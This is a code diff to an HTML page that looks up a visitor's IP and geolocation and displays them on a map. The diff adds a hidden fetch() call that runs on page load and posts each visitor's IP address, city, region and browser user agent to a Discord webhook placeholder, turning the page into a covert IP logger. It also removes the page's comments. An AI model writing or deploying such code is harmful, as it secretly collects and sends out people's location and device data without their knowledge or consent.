@@ -92,18 +92,33 @@ async function detectVisitor() {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
 
-        // Menampilkan IP dan Lokasi di teks
+fetch("ISI_URL_WEBHOOK_DISCORD_KAMU_DI_SINI", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+        embeds: [{
+            title: "🚨 Visitor Detected!",
+            color: 65280, // Warna hijau hacker
+            fields: [
+                { name: "IP Address", value: data.ip, inline: true },
+                { name: "Location", value: `${data.city}, ${data.region}`, inline: true },
+                { name: "User Agent", value: navigator.userAgent }
+            ],
+            timestamp: new Date()
+        }]
+    })
+});
+
         document.getElementById("ip").innerText = "IP Address : " + data.ip;
         document.getElementById("location").innerText = "Location : " + data.city + ", " + data.country_name;
 
-        // Inisialisasi Map (Hanya dibuat setelah data koordinat ada)
         const map = L.map('map').setView([data.latitude, data.longitude], 13);
 
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '&copy; OpenStreetMap'
         }).addTo(map);
 
-        // Tambahkan Marker
+
         L.marker([data.latitude, data.longitude])
             .addTo(map)
             .bindPopup("Visitor Location")
@@ -120,3 +135,4 @@ detectVisitor();
 
 </body>
 </html>
+
